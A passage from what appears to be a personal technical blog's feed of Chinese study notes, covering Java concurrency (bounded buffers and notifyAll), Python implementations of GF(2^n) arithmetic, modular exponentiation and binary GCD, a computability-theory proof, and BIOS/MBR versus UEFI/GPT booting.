class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseBoundedBuffer</span>&lt;<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> V[] buf;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> tail;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> head;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">BaseBoundedBuffer</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.buf = (V[]) <span class="keyword">new</span> Object[capacity];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">doPut</span><span class="params">(V v)</span> </span>&#123;</span><br><span class="line">        buf[tail] = v;</span><br><span class="line">        <span class="keyword">if</span> (++tail == buf.length)</span><br><span class="line">            tail = <span class="number">0</span>;</span><br><span class="line">        ++count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">final</span> V <span class="title">doTake</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        V v = buf[head];</span><br><span class="line">        buf[head] = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (++head == buf.length)</span><br><span class="line">            head = <span class="number">0</span>;</span><br><span class="line">        --count;</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">isFull</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> count == buf.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> count == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BoundedBuffer</span>&lt;<span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">BaseBoundedBuffer</span>&lt;<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// CONDITION PREDICATE: not-full (!isFull())</span></span><br><span class="line"><span class="comment">// CONDITION PREDICATE: not-empty (!isEmpty())</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BoundedBuffer</span><span class="params">(<span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// BLOCKS-UNTIL: not-full</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(V v)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (isFull())</span><br><span class="line">            wait();</span><br><span class="line">        doPut(v);</span><br><span class="line">        notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// BLOCKS-UNTIL: not-empty</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title">take</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (isEmpty())</span><br><span class="line">            wait();</span><br><span class="line">        V v = doTake();</span><br><span class="line">        notifyAll();</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种情况下有个问题：调用notify后，take被叫醒，然而还是empty——此时isFull不满足，所以本应该put方法被得到通知被执行，所以这个信号就好像丢失了</p></li><li><p>只有在同时满足以下两个条件时，才能用单一的notify而不是notifyAll</p><ul><li>所有等待的线程类型相同。只有一个条件谓词与条件队列相关，并且每个线程从wait返回后将执行相同的操作</li><li>在条件变量上每次通知最多只能唤醒一个线程来执行</li></ul></li><li><p>使用notifyAll比notify更容易正确，所以除非notifyAll对性能影响过大，否则应该优先使用notifyAll</p></li></ul><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul><li>对象的正确发布的责任是否是在使用者而不是在线程安全类，即线程安全类也要求被正确发布</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;以下大部分是《java并发编程实战》的笔记，以&lt;code&gt;JCIP&lt;/code&gt;简称之&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;对象的状态&quot;&gt;&lt;a href=&quot;#对象的状态&quot; class=&quot;headerlink&quot; title=&quot;对象的状
      
    
    </summary>
    
      <category term="JavaConcurrent" scheme="https://h-zex.github.io/categories/JavaConcurrent/"/>
    
    
  </entry>
  
  <entry>
    <title>$GF(2^n)$上算术运算的实现</title>
    <link href="https://h-zex.github.io/2018/10/18/GF-2-n%E4%B8%8A%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
    <id>https://h-zex.github.io/2018/10/18/GF-2-n上算术运算的实现/</id>
    <published>2018-10-18T12:06:10.000Z</published>
    <updated>2019-03-02T04:59:27.201Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p><a href="https://github.com/H-ZeX/Cryptorgraphy-Course/blob/master/CryptographyLib/GF2nElement.py" target="_blank" rel="noopener">代码</a></p></li><li><p>几个关键点</p><ul><li><p>求模时，算法如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__modAndDiv__</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    return the (x%y, x/y)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> y == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ZeroDivisionError</span><br><span class="line">    xl = util.bitLen(x)</span><br><span class="line">    yl = util.bitLen(y)</span><br><span class="line">    <span class="keyword">if</span> xl &lt; yl:</span><br><span class="line">        <span class="keyword">return</span> x, <span class="number">0</span></span><br><span class="line">    d = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> xl &gt;= yl:</span><br><span class="line">        x, d = Polynomial.__sub__(x, y &lt;&lt; (xl - yl)), Polynomial.__add__(d, (<span class="number">1</span> &lt;&lt; (xl - yl)))</span><br><span class="line">        xl = util.bitLen(x)</span><br><span class="line">    <span class="keyword">return</span> x, d</span><br></pre></td></tr></table></figure><p>要注意，不可以直接<code>__sub__(x, y)</code>，要<code>__sub__(x, y&lt;&lt;(xl-yl))</code>，保证<code>y&lt;&lt;(xl-yl)</code>的最高位与x的最高位是同一位，这样才能把x变小。如果直接减，因为<code>x^y^y=x</code>，也就是减去两次<code>y</code>等于没有减，从而死循环</p></li><li><p>计算乘法逆元时，可以使用extend gcd，也可以使用拉格朗日定理$a^{|s|}=e$（e是群S上的单位元），从而$a^{|s|-1}=a^{-1}$——因为每个元素都只有唯一逆元</p></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      在$GF(2^n)$域上的算术运算的python代码实现
    
    </summary>
    
      <category term="数学" scheme="https://h-zex.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
      <category term="密码学" scheme="https://h-zex.github.io/categories/%E6%95%B0%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="GF2n" scheme="https://h-zex.github.io/tags/GF2n/"/>
    
  </entry>
  
  <entry>
    <title>$x^y=z(mod\ n) 的所有相关问题的解法$</title>
    <link href="https://h-zex.github.io/2018/10/18/y-z-mod-n-%E7%9A%84%E6%89%80%E6%9C%89%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E6%B3%95/"/>
    <id>https://h-zex.github.io/2018/10/18/y-z-mod-n-的所有相关问题的解法/</id>
    <published>2018-10-18T10:45:58.000Z</published>
    <updated>2019-02-03T11:43:16.773Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以下$x$为未知数。所有数都是整数</p></blockquote><h2 id="a-x-b-mod-n"><a href="#a-x-b-mod-n" class="headerlink" title="$a^x=b(mod\ n)$"></a>$a^x=b(mod\ n)$</h2><ul><li>这是离散对数问题，是一个难的问题——Diffie-Hellman算法就依赖于该问题的难解性。</li></ul><h4 id="当-gcd-a-n-n-时"><a href="#当-gcd-a-n-n-时" class="headerlink" title="当$gcd(a, n)=n$时"></a>当$gcd(a, n)=n$时</h4><ul><li>如果$b=1$，则$x=0$，如果$b=0$，则x为任意正数</li></ul><h4 id="当-gcd-a-n-1-时"><a href="#当-gcd-a-n-1-时" class="headerlink" title="当$gcd(a,n)=1$时"></a>当$gcd(a,n)=1$时</h4><ul><li>使用baby-step giant-step算法，具体可以参考<a href="http://www.narutoacm.com/archives/solve-discrete-log/" target="_blank" rel="noopener">求解a^x=b(mod m)</a></li></ul><h2 id="x-a-b-mod-n"><a href="#x-a-b-mod-n" class="headerlink" title="$x^a=b(mod\ n)$"></a>$x^a=b(mod\ n)$</h2><ul><li>这也是一个难的问题，目前并没有高效的通解，RSA算法就依赖于$n=pq$（p、q为质数）时x的难解性</li></ul><h4 id="n-为质数时"><a href="#n-为质数时" class="headerlink" title="$n$为质数时"></a>$n$为质数时</h4><ul><li>根据费尔马小定理有$x^{n-1}=1(mod\ n)$</li><li>求解a在模$n-1$下的乘法逆元$b$，$x^{ab}=x^{1+k(n-1)}=x(mod\ n)$</li></ul><h4 id="n-为合数时"><a href="#n-为合数时" class="headerlink" title="$n$为合数时"></a>$n$为合数时</h4><ul><li>目前是没有<strong>通用</strong>的高效解的——不仅仅在$n=pq$（p、q为质数）时没有，而是$n$为任意合数时都没有</li><li>可以构造如下规约，使得如果$n$为多个（大于2个）质数的积时有高效解，那么RSA就被攻破。假设$y^e=c(mod\ pq)$，即$y^e+kpq=c$，然后假设有一个算法，对于$n=rst$（r、s、t为任意质数）时有高效算法$T$，那么，我们两边乘以$t^e$得到 $y^e\times t^e +kpqt^e=(yt)^e+kpqt^e=ct^e$，模上$pqt$，得到$(yt)^e=ct^e(mod\ pqt)$，让算法$T$求解出$yt$，从而，我们得到了$y=yt\times t^{-1}(mod\ pqt)$</li></ul><h2 id="a-b-x-mod-n"><a href="#a-b-x-mod-n" class="headerlink" title="$a^b=x(mod\ n)$"></a>$a^b=x(mod\ n)$</h2><ul><li><p>快速模幂，算法如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fastModulePow</span><span class="params">(x, y, n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :return: x**y mod n</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> y == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> % n</span><br><span class="line">    ans, x = <span class="number">1</span> % n, x % n</span><br><span class="line">    <span class="keyword">while</span> y != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> (y &amp; <span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">            ans = x * ans % n</span><br><span class="line">        x, y = x * x % n, y // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;以下$x$为未知数。所有数都是整数&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;a-x-b-mod-n&quot;&gt;&lt;a href=&quot;#a-x-b-mod-n&quot; class=&quot;headerlink&quot; title=&quot;$a^x=b(mod\ n)$&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="数学" scheme="https://h-zex.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
      <category term="密码学" scheme="https://h-zex.github.io/categories/%E6%95%B0%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="离散对数" scheme="https://h-zex.github.io/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/"/>
    
      <category term="快速幂" scheme="https://h-zex.github.io/tags/%E5%BF%AB%E9%80%9F%E5%B9%82/"/>
    
      <category term="RSA" scheme="https://h-zex.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>对Introduction to the Theory of Computation 3rd Theorem 9.20 的一些理解</title>
    <link href="https://h-zex.github.io/2018/09/29/%E5%AF%B9ITOC-3rd-Theorem-9-20-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/"/>
    <id>https://h-zex.github.io/2018/09/29/对ITOC-3rd-Theorem-9-20-的一些理解/</id>
    <published>2018-09-29T06:45:15.000Z</published>
    <updated>2019-01-12T01:23:48.385Z</updated>
    
    <content type="html"><![CDATA[<ul><li><img src="/2018/09/29/对ITOC-3rd-Theorem-9-20-的一些理解/1.png"></li><li>证明中，通过枚举所有的P时间内运行的图灵机，然后利用对角化方法，来构造集合$A$，使得对于某一个$M_i$和某一个选定的$n$，要么$M_i$识别$1^n$，但是$A$不包含长度为n的字符串，要么$M_i$不识别$1^n$，但是$A$包含某一个长度为n的字符串。并且，为了使得$M_i$与$n$可以一一对应，要求所选取的$n$单调增长</li><li>按照文中描述的方法，构造似乎可以成立。但是，有一个重要的地方作者没有提及——<strong>无论集合$A$是否构造好，</strong>我们都应该可以运行任意一台$M_i$，$M_i$行为要保持一致</li><li>在我们运行$M_i$来构造集合$A$ 的过程中，每次$M_i$查询orcale，orcale都会因为长度为$n$ 的字符串尚未被决定是否加进去集合$A$而回答NO，不过，如果我们决定长度为$n$的字符串是否加进去集合$A$中后，orcale会如实回答。那么，在长度为n的字符串被决定是否加进去集合$A$之前和之后，orcale对某些字符串的回答不一致是否会导致$M_i$ 的行为改变，从而本来$M_i$不识别$1^n$，现在却识别了$1^n$，或者相反</li><li>可以证明，无论$A$是否构造好，$M_i$的行为还是会保持一致</li><li>一开始，长度为$n$的字符串还没有加进去时，orcale都是回答NO，所以：<ul><li>如果$M_i$不识别$1^n$，我们就给$A$加进去一个$M_i$没有询问到长度为n的字符串，从而，虽然集合$A$现在有了长度为$n$的字符串，但是，对于输入$1^n$，$M_i$对orcale的询问的答案依然全部是NO——因为输入确定，$M_i$确定，所以$M_i$究竟会询问orcale哪些字符串也是确定的——只要我们保证对询问的回答是一致的</li><li>如果$M_i$识别$1^n$，那么我们根本就不会给集合$A$加进去长度为$n$的字符串，那么，对于输入$1^n$，orcale对$M_i$的询问的结果依然全部是NO</li></ul></li><li>这个证明要成立还有一个很重要的地方，图灵机是可数个的，因为对于每一台$M_i$，我们都使用独特的$n$，那么，如果图灵机有不可数个，这个一一对应关系就无法建立。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;img src=&quot;/2018/09/29/对ITOC-3rd-Theorem-9-20-的一些理解/1.png&quot;&gt;&lt;/li&gt;
&lt;li&gt;证明中，通过枚举所有的P时间内运行的图灵机，然后利用对角化方法，来构造集合$A$，使得对于某一个$M_i$和某一个选定的$n$
      
    
    </summary>
    
      <category term="计算理论" scheme="https://h-zex.github.io/categories/%E8%AE%A1%E7%AE%97%E7%90%86%E8%AE%BA/"/>
    
    
      <category term="图灵机" scheme="https://h-zex.github.io/tags/%E5%9B%BE%E7%81%B5%E6%9C%BA/"/>
    
      <category term="P与NP" scheme="https://h-zex.github.io/tags/P%E4%B8%8ENP/"/>
    
      <category term="对角化" scheme="https://h-zex.github.io/tags/%E5%AF%B9%E8%A7%92%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Binary GCD And Extend Binary GCD</title>
    <link href="https://h-zex.github.io/2018/09/17/Binary-GCD-And-Extend-Binary-GCD/"/>
    <id>https://h-zex.github.io/2018/09/17/Binary-GCD-And-Extend-Binary-GCD/</id>
    <published>2018-09-17T13:58:41.000Z</published>
    <updated>2018-10-18T12:49:30.017Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Binary-GCD"><a href="#Binary-GCD" class="headerlink" title="Binary GCD"></a>Binary GCD</h2><ul><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binaryGCD</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    x, y = abs(x), abs(y)</span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span> <span class="keyword">or</span> y == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> x + y</span><br><span class="line">    <span class="keyword">if</span> x == y:</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="comment"># this cycle is O(N^2)(assume that N = max(lgx, lgy))</span></span><br><span class="line">    <span class="keyword">while</span> ((x &amp; <span class="number">1</span>) | (y &amp; <span class="number">1</span>)) == <span class="number">0</span>:</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        x = x &gt;&gt; <span class="number">1</span></span><br><span class="line">        y = y &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="comment"># the y below is surely odd</span></span><br><span class="line">    <span class="comment"># when x-y, x and y are odd, so x will become even</span></span><br><span class="line">    <span class="comment"># so the x&gt;&gt;1 will be run every cycles</span></span><br><span class="line">    <span class="comment"># so this cycle is O(N^2)</span></span><br><span class="line">    <span class="keyword">while</span> x != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">while</span> (x &amp; <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">            x = x &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> y &gt; x:</span><br><span class="line">            x, y = y, x</span><br><span class="line">        x, y = x - y, y</span><br><span class="line">    <span class="keyword">return</span> y * (<span class="number">1</span> &lt;&lt; cnt)</span><br></pre></td></tr></table></figure></li><li><p>复杂度分析：设$n=max(bitlen(x), bitlen(y))$。17行开始的循环中，因为<code>y</code>必然为奇数，所以<code>x-y</code>为偶数，所以第18行的循环在每次外层循环运行一次时都至少运行一次，所以有$O(n)$次循环，每次循环需要$O(n)$的均摊复杂度——因为第18行的每次都是$O(n)$的复杂度，然后整个算法中这种移位最多有$O(n)$次，所以，整个算法复杂度为$O(n^2)$</p></li><li><p>trivial 版本的GCD如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCD</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> y != <span class="number">0</span>:</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure><p>需要$O(n^3)$的复杂度</p></li></ul><h2 id="Extend-Binary-GCD"><a href="#Extend-Binary-GCD" class="headerlink" title="Extend Binary GCD"></a>Extend Binary GCD</h2><ul><li><p>代码，<a href="http://www.ucl.ac.uk/~ucahcjm/combopt/ext_gcd_python_programs.pdf" target="_blank" rel="noopener">引用自</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extendBinaryGCD</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="string">"""Extended binary GCD.</span></span><br><span class="line"><span class="string">    Given input a, b the function returns s, t, d</span></span><br><span class="line"><span class="string">    such that gcd(a,b) = d = as + bt."""</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">1</span>, b</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">if</span> a == b:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    u, v, s, t, r = <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (a % <span class="number">2</span> == <span class="number">0</span>) <span class="keyword">and</span> (b % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">        a, b, r = a // <span class="number">2</span>, b // <span class="number">2</span>, r + <span class="number">1</span></span><br><span class="line">    alpha, beta = a, b</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># from here on we maintain a = u * alpha + v * beta</span></span><br><span class="line">    <span class="comment"># and b = s * alpha + t * beta</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">while</span> a % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># v is always even</span></span><br><span class="line">        a = a // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (u % <span class="number">2</span> == <span class="number">0</span>) <span class="keyword">and</span> (v % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">            u, v = u // <span class="number">2</span>, v // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            u, v = (u + beta) // <span class="number">2</span>, (v - alpha) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> a != b:</span><br><span class="line">        <span class="keyword">if</span> b % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            b = b // <span class="number">2</span></span><br><span class="line">            <span class="comment">#</span></span><br><span class="line">            <span class="comment"># Commentary: note that here, since b is even,</span></span><br><span class="line">            <span class="comment"># (i) if s, t are both odd then so are alpha, beta</span></span><br><span class="line">            <span class="comment"># (ii) if s is odd and t even then alpha must be even, so beta is odd</span></span><br><span class="line">            <span class="comment"># (iii) if t is odd and s even then beta must be even, so alpha is odd</span></span><br><span class="line">            <span class="comment"># so for each of (i), (ii) and (iii) s + beta and t - alpha are even</span></span><br><span class="line">            <span class="comment">#</span></span><br><span class="line">            <span class="keyword">if</span> (s % <span class="number">2</span> == <span class="number">0</span>) <span class="keyword">and</span> (t % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">                s, t = s // <span class="number">2</span>, t // <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                s, t = (s + beta) // <span class="number">2</span>, (t - alpha) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> b &lt; a:</span><br><span class="line">            a, b, u, v, s, t = b, a, s, t, u, v</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b, s, t = b - a, s - u, t - v</span><br><span class="line">    <span class="keyword">return</span> s, t, (<span class="number">2</span> ** r) * a</span><br></pre></td></tr></table></figure></li><li><p>思路：从19行开始，维护式子b=s*alpha+t*beta 的成立——可以验证，每次s、t更改后，式子还是成立</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Binary-GCD&quot;&gt;&lt;a href=&quot;#Binary-GCD&quot; class=&quot;headerlink&quot; title=&quot;Binary GCD&quot;&gt;&lt;/a&gt;Binary GCD&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;代码&lt;/p&gt;
&lt;figure class=&quot;highlig
      
    
    </summary>
    
      <category term="数学" scheme="https://h-zex.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
      <category term="密码学" scheme="https://h-zex.github.io/categories/%E6%95%B0%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="欧几里得算法" scheme="https://h-zex.github.io/tags/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/"/>
    
      <category term="扩展欧几里得" scheme="https://h-zex.github.io/tags/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97/"/>
    
      <category term="二进制欧几里得算法" scheme="https://h-zex.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Booting a System</title>
    <link href="https://h-zex.github.io/2018/09/17/Booting-a-System/"/>
    <id>https://h-zex.github.io/2018/09/17/Booting-a-System/</id>
    <published>2018-09-17T01:22:08.000Z</published>
    <updated>2018-09-17T04:20:31.051Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Legacy-BIOS"><a href="#Legacy-BIOS" class="headerlink" title="Legacy BIOS"></a>Legacy BIOS</h2><ul><li>传统的bios假设boot device start with a record called MBR，MBR512个字节，包含first-stage boot loader（也叫boot block）和一个分区表</li><li>无论是BIOS还是第一阶段的boot loader都没有足够的能力去读取标准的文件系统，所以第二阶段的boot loader的位置必须足够容易获取。在大多数场景下，boot block从MBR读取分区表，识别出那些marked as “active”的硬盘分区，然后其从这些分区的开头读取并运行第二阶段boot loader，这个方案被叫做”volume boot record”</li><li>第二阶段的boot loader还可以处于MBR和第一个磁盘分区之间的”dead zone”。由于历史原因，第一个磁盘分区从第64个disk block开始（MBR所在的那个是第0个block），所以这个区域包含有32KB的空间，这个空间足够包含一个文件系统驱动。这个方案通常被GRUB使用</li><li>MBR boot block是OS-agnostic的，但是因为第二阶段的boot loader有多个版本可以安装，所以第二阶段的boot loader通常是了解操作系统和文件系统的，并且是可配置的</li></ul><h3 id="MBR"><a href="#MBR" class="headerlink" title="MBR"></a>MBR</h3><ul><li><blockquote><p>MBR disks support only four partition table entries. For more than four partitions, a secondary structure known as an extended partition is necessary. Extended partitions can then be subdivided into one or more logical disks.</p></blockquote></li></ul><h2 id="EFI"><a href="#EFI" class="headerlink" title="EFI"></a>EFI</h2><ul><li>Intel’s extensible firmware interface (EFI) </li><li>EFI演变成UEFI（unified EFI），被多家制造商支持，不过EFI仍然是更常使用的术语。EFI和UEFI基本上可以互换使用</li></ul><h3 id="GPT"><a href="#GPT" class="headerlink" title="GPT"></a>GPT</h3><ul><li><p>The EFI partitioning scheme, known as a “GUID partition table” or GPT</p><blockquote><p>A partition is a contiguous space of storage on a physical or logical disk that functions as if it were a physically separate disk. Partitions are visible to the system firmware and the installed operating systems. Access to a partition is controlled by the system firmware before the system boots the operating system, and then by the operating system after it is started.</p></blockquote></li><li><p>只有一种分区类型（没有诸如逻辑分区），可以任意多的分区数目，有16-byte的GUID</p><blockquote><p>The specification allows an almost unlimited number of partitions. However, the Windows implementation restricts this to 128 partitions. The number of partitions is limited by the amount of space reserved for partition entries in the GPT.</p><p>The 16-byte partition type GUID, which is similar to a System ID in the partition table of an MBR disk, identifies the type of data that the partition contains and identifies how the partition is used, for example, whether it is a basic disk or a dynamic disk. Note that each GUID partition entry has a backup copy.</p></blockquote></li><li><blockquote><p><a href="https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-and-gpt-faq" target="_blank" rel="noopener">Windows and GPT FAQ</a></p><h5 id="Can-a-disk-be-both-GPT-and-MBR"><a 